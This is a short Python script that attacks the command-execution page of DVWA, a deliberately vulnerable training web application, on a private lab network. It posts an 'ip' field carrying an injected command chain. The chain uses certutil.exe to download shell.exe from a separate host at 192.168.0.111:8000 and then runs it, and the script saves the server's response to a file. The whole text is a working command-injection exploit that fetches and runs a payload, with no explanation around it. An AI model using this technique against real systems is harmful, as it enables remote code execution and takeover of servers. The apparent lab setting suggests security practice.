#! /usr/bin/python3
import requests

COMMAND = "&dir &certutil.exe -urlcache -f http://192.168.0.111:8000/shell.exe shell.exe &dir &.\\shell.exe"


URL = "http://192.168.0.112/dvwa/vulnerabilities/exec/index.php"
DATA = {"ip":"192.168.0.102"+COMMAND,"Submit":"Submit"}
COOKIES = {"PHPSESSID":"tjj0esrnt64heiqr50hbbpj8s4","security":"low"}


r = requests.post(URL,data=DATA, cookies=COOKIES)

with open('file.html',"w+") as file:
    file.write(r.text)
